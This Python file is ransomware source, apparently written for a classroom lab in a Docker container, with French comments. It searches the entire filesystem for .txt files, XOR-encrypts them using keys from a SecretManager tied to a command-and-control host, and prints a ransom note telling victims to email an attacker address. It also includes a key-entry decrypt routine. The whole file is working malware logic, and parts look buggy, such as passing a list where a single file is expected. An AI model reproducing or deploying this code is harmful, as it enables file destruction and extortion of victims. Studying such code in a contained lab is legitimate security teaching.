import logging
import socket
import re
import sys
from pathlib import Path
from secret_manager import SecretManager
import os

import random


CNC_ADDRESS = "cnc:6666"
TOKEN_PATH = "/root/token"

ENCRYPT_MESSAGE = """
   ____  _                     _ 
  / __ \| |                   | |
 | |  | | |__    _ __   ___   | |
 | |  | | '_ \  | '_ \ / _ \  | |
 | |__| | | | | | | | | (_) | |_|
  \____/|_| |_| |_| |_|\___/  (_)
                                 
You shouldn't activate macros in random downloaded Word documents.
Your txt files have been locked. Send an email to evil@hell.com with title '{token}' to unlock your data. 
"""
class Ransomware:
    def __init__(self) -> None:
        self.check_hostname_is_docker()
    
    def check_hostname_is_docker(self)->None:
        # At first, we check if we are in a docker
        # to prevent running this program outside of container
        hostname = socket.gethostname()
        result = re.match("[0-9a-f]{6,6}", hostname)
        if result is None:
            print(f"You must run the malware in docker ({hostname}) !")
            sys.exit(1)

    def get_files(self, filter:str)->list:
        # return all files matching the filter
        
        # on crée la liste de tous les strings en appelant la fonction rglob()
        list = sorted(Path("/").rglob(filter))

        return list

    def encrypt(self):
        # main function for encrypting (see PDF)
        #lister les fichiers txt
        list = self.get_files("*.txt")
        
        #appeler la classe SecretManager()
        call = SecretManager(CNC_ADDRESS, TOKEN_PATH)
        call.setup()

        #chiffrement des fichiers
        for i in range(len(list)):
            call.xorfiles(list[i])

        #affichage du message permettant à la victime de contacter l'attaquant
        token = call.get_hex_token()
        print(ENCRYPT_MESSAGE.format(token = token))
        

    def decrypt(self):
        # main function for decrypting (see PDF)
        print("If you want to free your data, please enter your key:")
        key = input()

        call = SecretManager(CNC_ADDRESS, TOKEN_PATH)
        call.load()
        
        try:
            call.set_key(key)
            print("Getting files...")
            list = self.get_files("*.txt")
            print("Deciphering files...")
            call.xorfiles(list)
            print("Cleaning everything...")
            call.clean()

            print("Everything went well, you now have access to your files.")

            quit()

        except:
            print("Unknown error: couldn't decipher files")



if __name__ == "__main__":
    logging.basicConfig(level=logging.DEBUG)
    if len(sys.argv) < 2:
        ransomware = Ransomware()
        ransomware.encrypt()

        #temporaire
        ransomware.decrypt()

    elif sys.argv[1] == "--decrypt":
        ransomware = Ransomware()
        ransomware.decrypt()